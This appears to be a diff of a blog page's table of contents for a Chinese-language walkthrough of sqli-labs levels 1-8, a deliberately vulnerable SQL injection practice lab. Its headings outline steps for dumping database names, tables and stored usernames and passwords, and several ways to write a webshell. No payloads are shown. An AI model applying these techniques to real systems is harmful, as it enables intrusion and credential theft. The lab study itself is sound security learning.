@@ -3501,7 +3338,7 @@ limit 2,1<br>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-1-8"><span class="toc-text"> sqli-labs-1-8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8"><span class="toc-text"> SQL 注入常用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%AA%E9%87%8C%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"><span class="toc-text"> 哪里存在 SQL 注入？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text"> sql 注入的类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E4%B8%AD3%E7%A7%8D%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-text"> MySQL 中 3 种注释风格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text"> 判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-text"> 步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text"> 1、判断列数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-text"> 2、判断显示位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%BD%93%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E5%92%8C%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text"> 3、获取当数据库名称和当前连接数据库的用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text"> 4、列出所有数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93test%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-text"> 5、列出 (数据库：test) 中所有的表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93test-%E8%A1%A8admin-%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text"> 6、列出（数据库：test 表：admin ）中所有的字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93test-%E8%A1%A8admin-%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text"> 7、列出（数据库：test 表：admin ）中的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-1"><span class="toc-text"> sqli-labs-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8order-by%E7%8C%9C%E8%A7%A3%E5%88%97%E6%95%B0"><span class="toc-text"> 用 order by 猜解列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text"> 显示回显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-text"> 爆数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-text"> 查询表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%98%8E"><span class="toc-text"> 查询列明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text"> 查询数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-2"><span class="toc-text"> sqli-labs-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="toc-text"> 查询列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%93%AA%E4%B8%AA%E5%AD%97%E6%AE%B5%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text"> 确定哪个字段有回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text"> 确定当前数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text"> 得出数据库所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 得出数据库所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BAusers%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 得出 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-text"> 写入 webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-3"><span class="toc-text"> sqli-labs-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-2"><span class="toc-text"> 初步判断</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%8B%E6%98%AF%E5%90%A6%E5%9B%9E%E6%98%BE"><span class="toc-text"> 判断一下是否回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%9C%80%E8%A6%81%E9%97%AD%E5%90%88%E4%BB%80%E4%B9%88%E7%AC%A6%E5%8F%B7"><span class="toc-text"> 判断需要闭合什么符号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text"> 判断是什么型注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E6%95%B0"><span class="toc-text"> 获取列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%ADusers%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 获取数据库中 users 表的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%87%BAusers%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 爆出 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshelll"><span class="toc-text"> 写入 webshelll</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-4"><span class="toc-text"> sqli-labs-4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-3"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text"> 判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E5%AD%97%E6%AE%B5"><span class="toc-text"> 判断回显字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-2"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text"> 获取所有的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-5"><span class="toc-text"> sqli-labs-5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%85%B3%E6%B6%89%E5%8F%8A%E5%86%85%E5%AE%B9"><span class="toc-text"> 本关涉及内容</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml"><span class="toc-text"> updatexml()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#concat"><span class="toc-text"> concat()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr"><span class="toc-text"> substr()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#select-distinct"><span class="toc-text"> select distinct()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-4"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-3"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-2"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 获取 users 所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 获取所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-2"><span class="toc-text"> 写入 webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell%E5%BD%92%E7%BA%B3"><span class="toc-text"> 写入 webshell 归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-union-select%E5%86%99%E5%85%A5"><span class="toc-text"> 1、union select 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lines-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text"> Lines terminated by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-lines-starting-by%E5%86%99%E5%85%A5"><span class="toc-text"> 3、lines starting by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-fields-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text"> 4、fields terminated by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-columns-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text"> 5、COLUMNS terminated by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8log%E5%86%99%E5%85%A5"><span class="toc-text"> 6、利用 log 写入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-6"><span class="toc-text"> sqli-labs-6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-5"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-4"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-3"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 获取 users 表中的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 获取 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-3"><span class="toc-text"> 写入 webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-7"><span class="toc-text"> sqli-labs-7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-6"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-5"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-4"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D-2"><span class="toc-text"> 获取 users 表中的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword-2"><span class="toc-text"> 获取 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-4"><span class="toc-text"> 写入 webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-8"><span class="toc-text"> sqli-labs-8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-7"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-6"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E4%BF%A1%E6%81%AF"><span class="toc-text"> 获取所有信息</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-1-8"><span class="toc-text">sqli-labs-1-8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8"><span class="toc-text">SQL注入常用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%AA%E9%87%8C%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-text">哪里存在SQL注入？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">sql注入的类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL%E4%B8%AD3%E7%A7%8D%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-text">MySQL中3种注释风格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-text">步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text">1、判断列数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-text">2、判断显示位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E5%92%8C%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text">3、获取当数据库名称和当前连接数据库的用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">4、列出所有数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E5%88%97%E5%87%BA-%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9Atest-%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-text">5、列出(数据库：test)中所有的表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E5%88%97%E5%87%BA%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9Atest-%E8%A1%A8%EF%BC%9Aadmin-%EF%BC%89%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text">6、列出（数据库：test 表：admin ）中所有的字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E5%88%97%E5%87%BA%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9Atest-%E8%A1%A8%EF%BC%9Aadmin-%EF%BC%89%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text">7、列出（数据库：test 表：admin ）中的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-1"><span class="toc-text">sqli-labs-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8order-by%E7%8C%9C%E8%A7%A3%E5%88%97%E6%95%B0"><span class="toc-text">用order by猜解列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">显示回显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-text">爆数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%98%8E"><span class="toc-text">查询列明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">查询数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-2"><span class="toc-text">sqli-labs-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD"><span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="toc-text">查询列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%93%AA%E4%B8%AA%E5%AD%97%E6%AE%B5%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text">确定哪个字段有回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text">确定当前数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text">得出数据库所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text">得出数据库所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BAusers%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text">得出users表中的所有username和password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-text">写入webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-3"><span class="toc-text">sqli-labs-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-1"><span class="toc-text">初步判断</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%8B%E6%98%AF%E5%90%A6%E5%9B%9E%E6%98%BE"><span class="toc-text">判断一下是否回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%9C%80%E8%A6%81%E9%97%AD%E5%90%88%E4%BB%80%E4%B9%88%E7%AC%A6%E5%8F%B7"><span class="toc-text">判断需要闭合什么符号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">判断是什么型注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E6%95%B0"><span class="toc-text">获取列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text">获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%ADusers%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text">获取数据库中users表的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%87%BAusers%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text">爆出users表中的所有username和password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshelll"><span class="toc-text">写入webshelll</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-4"><span class="toc-text">sqli-labs-4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-2"><span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text">判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E5%AD%97%E6%AE%B5"><span class="toc-text">判断回显字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-1"><span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text">获取所有的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-5"><span class="toc-text">sqli-labs-5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%85%B3%E6%B6%89%E5%8F%8A%E5%86%85%E5%AE%B9"><span class="toc-text">本关涉及内容</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#concat"><span class="toc-text">concat()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr"><span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#select-distinct"><span class="toc-text">select distinct()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-3"><span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-2"><span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-1"><span class="toc-text">获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text">获取users所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text">获取所有username和password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-1"><span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell%E5%BD%92%E7%BA%B3"><span class="toc-text">写入webshell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81union-select%E5%86%99%E5%85%A5"><span class="toc-text">1、union select写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Lines-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text">Lines terminated by写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81lines-starting-by%E5%86%99%E5%85%A5"><span class="toc-text">3、lines starting by写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 